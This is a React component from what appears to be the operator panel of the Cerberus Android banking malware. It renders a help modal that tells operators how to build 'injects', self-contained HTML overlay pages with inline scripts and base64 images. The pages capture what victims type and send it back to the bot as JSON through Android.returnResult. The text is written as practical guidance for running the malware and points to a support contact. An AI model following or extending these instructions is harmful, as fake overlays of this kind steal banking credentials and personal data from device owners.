import { useState } from "react";
import { Button, Modal } from "antd"

interface HelpProps {
    className?: string
}

const Help = (props: HelpProps) => {
    const [isModalVisible, setIsModalVisible] = useState(false);
    const showModal = () => {
        setIsModalVisible(true);
    };

    const handleOk = () => {
        setIsModalVisible(false);
    };

    const handleCancel = () => {
        setIsModalVisible(false);
    };

    return (
        <>
            <Button type="primary" ghost {...props} onClick={showModal}>Help</Button>
            <Modal title="Instructions for creating injects for Malware Cerberus." visible={isModalVisible} onOk={handleOk} onCancel={handleCancel} >
                <p>
                    Cerberus injects are an HTML file that contains css and JS code. <br />
                    Injects are downloaded to the device, and work locally, without access to the Internet, so there is NO downloads of anything (images or scripts) from the Internet! Enter everything in the html file, and more specifically: scripts as plain text, and insert images into base64. <br />
                    <br />
                    To send inject information about the entered data, use the Android.returnResult function, which accepts valid JSON. <br />
                    In the examples of our injects there are examples of using this function. If you want to complete the work of the injection after it has been executed, then you must send the "exit":"" parameter to JSON, since it shows the bot that everything is injected into the injection, and you do not need to re-show it. <br />
                    <br />
                    If there will be additional questions, please write to support. <br />
                    Examples of injects provide.
                </p>
            </Modal>

        </>
    )
}

export default Help